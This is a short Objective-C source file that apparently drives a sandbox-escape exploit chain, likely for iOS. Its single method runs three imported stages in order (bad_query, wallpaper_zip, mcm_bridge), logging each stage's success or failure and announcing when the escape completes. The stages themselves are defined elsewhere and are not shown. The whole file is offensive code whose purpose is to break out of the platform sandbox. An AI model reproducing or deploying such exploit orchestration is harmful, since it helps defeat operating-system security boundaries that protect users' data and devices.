#import "SandboxEscaper.h"
#import "bad_query.h"
#import "wallpaper_zip.h"
#import "mcm_bridge.h"

@implementation SandboxEscaper

+ (BOOL)escapeSandbox {
    NSLog(@"[SandboxEscaper] Starting sandbox escape...");
    
    if (run_bad_query() != 0) {
        NSLog(@"[SandboxEscaper] bad_query failed.");
        return NO;
    }
    NSLog(@"[SandboxEscaper] bad_query succeeded.");
    
    if (run_wallpaper_zip() != 0) {
        NSLog(@"[SandboxEscaper] wallpaper_zip failed.");
        return NO;
    }
    NSLog(@"[SandboxEscaper] wallpaper_zip succeeded.");
    
    if (run_mcm_bridge() != 0) {
        NSLog(@"[SandboxEscaper] mcm_bridge failed.");
        return NO;
    }
    NSLog(@"[SandboxEscaper] mcm_bridge succeeded.");
    
    NSLog(@"[SandboxEscaper] Sandbox escape completed successfully!");
    return YES;
}

@end
